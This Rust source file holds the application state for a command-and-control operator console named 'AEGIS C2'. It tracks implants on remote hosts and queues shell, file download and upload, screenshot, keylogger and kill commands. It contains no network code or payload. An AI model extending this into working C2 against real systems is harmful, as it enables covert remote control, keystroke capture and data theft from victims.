use std::collections::HashMap;

/// Information about a connected implant.
#[derive(Debug, Clone)]
pub struct ImplantInfo {
    pub id: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub ip: String,
    pub last_seen: u64,
    pub sleep_secs: u64,
}

/// A command entry in the session log.
#[derive(Debug, Clone)]
pub struct CommandEntry {
    pub timestamp: String,
    pub input: String,
    pub output: Option<String>,
}

/// C2 Operator Console application state.
pub struct App {
    listen_addr: String,
    dns_domain: String,
    implants: Vec<ImplantInfo>,
    selected: usize,
    command_histories: HashMap<String, Vec<CommandEntry>>,
    input_buffer: String,
    should_quit: bool,
    status_message: String,
}

impl App {
    pub fn new(listen: &str, dns_domain: &str, _key: Option<&str>) -> Self {
        Self {
            listen_addr: listen.to_string(),
            dns_domain: dns_domain.to_string(),
            implants: Vec::new(),
            selected: 0,
            command_histories: HashMap::new(),
            input_buffer: String::new(),
            should_quit: false,
            status_message: format!("AEGIS C2 listening on {listen} | DNS: {dns_domain}"),
        }
    }

    pub fn dns_domain(&self) -> &str {
        &self.dns_domain
    }

    pub fn listen_addr(&self) -> &str {
        &self.listen_addr
    }

    pub fn implants(&self) -> &[ImplantInfo] {
        &self.implants
    }

    pub fn selected_index(&self) -> usize {
        self.selected
    }

    pub fn selected_implant(&self) -> Option<&ImplantInfo> {
        self.implants.get(self.selected)
    }

    pub fn input(&self) -> &str {
        &self.input_buffer
    }

    pub fn status(&self) -> &str {
        &self.status_message
    }

    pub fn should_quit(&self) -> bool {
        self.should_quit
    }

    pub fn quit(&mut self) {
        self.should_quit = true;
    }

    pub fn add_implant(&mut self, info: ImplantInfo) {
        let id = info.id.clone();
        self.implants.push(info);
        self.command_histories.entry(id).or_default();
    }

    pub fn select_next(&mut self) {
        if !self.implants.is_empty() {
            self.selected = (self.selected + 1) % self.implants.len();
        }
    }

    pub fn select_prev(&mut self) {
        if !self.implants.is_empty() {
            self.selected = self
                .selected
                .checked_sub(1)
                .unwrap_or(self.implants.len() - 1);
        }
    }

    pub fn push_input(&mut self, ch: char) {
        self.input_buffer.push(ch);
    }

    pub fn pop_input(&mut self) {
        self.input_buffer.pop();
    }

    pub fn clear_input(&mut self) {
        self.input_buffer.clear();
    }

    pub fn command_history(&self, implant_id: &str) -> &[CommandEntry] {
        self.command_histories
            .get(implant_id)
            .map(|v| v.as_slice())
            .unwrap_or(&[])
    }

    pub fn current_history(&self) -> &[CommandEntry] {
        self.selected_implant()
            .map(|imp| self.command_history(&imp.id))
            .unwrap_or(&[])
    }

    /// Parse a command input string into (command, args).
    pub fn parse_command_input(input: &str) -> (&str, &str) {
        let trimmed = input.trim();
        match trimmed.find(' ') {
            Some(pos) => (&trimmed[..pos], trimmed[pos + 1..].trim()),
            None => (trimmed, ""),
        }
    }

    /// Execute a command on the currently selected implant.
    pub fn execute_command(&mut self, raw_input: &str) {
        let Some(implant) = self.implants.get(self.selected) else {
            self.status_message = "No implant selected".to_string();
            return;
        };
        let implant_id = implant.id.clone();
        let (cmd, args) = Self::parse_command_input(raw_input);

        let output = match cmd {
            "shell" => {
                if args.is_empty() {
                    Some("Usage: shell <command>".to_string())
                } else {
                    Some(format!("[queued] shell: {args}"))
                }
            }
            "download" => {
                if args.is_empty() {
                    Some("Usage: download <remote_path>".to_string())
                } else {
                    Some(format!("[queued] download: {args}"))
                }
            }
            "upload" => {
                let parts: Vec<&str> = args.splitn(2, ' ').collect();
                if parts.len() < 2 {
                    Some("Usage: upload <local_path> <remote_path>".to_string())
                } else {
                    Some(format!("[queued] upload: {} -> {}", parts[0], parts[1]))
                }
            }
            "screenshot" => Some("[queued] screenshot capture".to_string()),
            "keylog" => Some("[queued] keylogger toggle".to_string()),
            "sleep" => {
                if let Ok(secs) = args.parse::<u64>() {
                    Some(format!("[queued] sleep interval: {secs}s"))
                } else {
                    Some("Usage: sleep <seconds>".to_string())
                }
            }
            "die" => Some("[queued] kill implant".to_string()),
            "info" => {
                let imp = &self.implants[self.selected];
                Some(format!(
                    "ID: {}\nHostname: {}\nUser: {}\nOS: {}\nIP: {}\nSleep: {}s",
                    imp.id, imp.hostname, imp.username, imp.os, imp.ip, imp.sleep_secs
                ))
            }
            "help" => Some(
                "Commands: shell <cmd>, download <path>, upload <src> <dst>, \
                 screenshot, keylog, sleep <secs>, die, info, help"
                    .to_string(),
            ),
            _ => Some(format!("Unknown command: {cmd}. Type 'help' for usage.")),
        };

        let now = chrono::Utc::now()
            .format("%Y-%m-%d %H:%M:%S UTC")
            .to_string();
        let entry = CommandEntry {
            timestamp: now,
            input: raw_input.to_string(),
            output,
        };

        self.command_histories
            .entry(implant_id)
            .or_default()
            .push(entry);

        self.input_buffer.clear();
    }

    /// Submit the current input buffer as a command.
    pub fn submit_input(&mut self) {
        let input = self.input_buffer.clone();
        if !input.trim().is_empty() {
            self.execute_command(&input);
        }
    }

    /// Export all session logs as a markdown transcript.
    pub fn export_transcript(&self) -> String {
        let mut out = String::new();
        out.push_str("# AEGIS C2 Session Transcript\n\n");
        out.push_str(&format!("Listener: {}\n", self.listen_addr));
        out.push_str(&format!("DNS Domain: {}\n\n", self.dns_domain));

        for implant in &self.implants {
            out.push_str(&format!(
                "## Implant: {} ({})\n\n",
                implant.id, implant.hostname
            ));
            out.push_str(&format!(
                "- User: {}\n- OS: {}\n- IP: {}\n- Sleep: {}s\n\n",
                implant.username, implant.os, implant.ip, implant.sleep_secs
            ));

            let history = self.command_history(&implant.id);
            if history.is_empty() {
                out.push_str("*No commands executed*\n\n");
            } else {
                out.push_str("### Command Log\n\n");
                for entry in history {
                    out.push_str(&format!("**[{}]** `{}`\n", entry.timestamp, entry.input));
                    if let Some(ref output) = entry.output {
                        out.push_str(&format!("```\n{output}\n```\n"));
                    }
                    out.push('\n');
                }
            }
        }

        out
    }
}
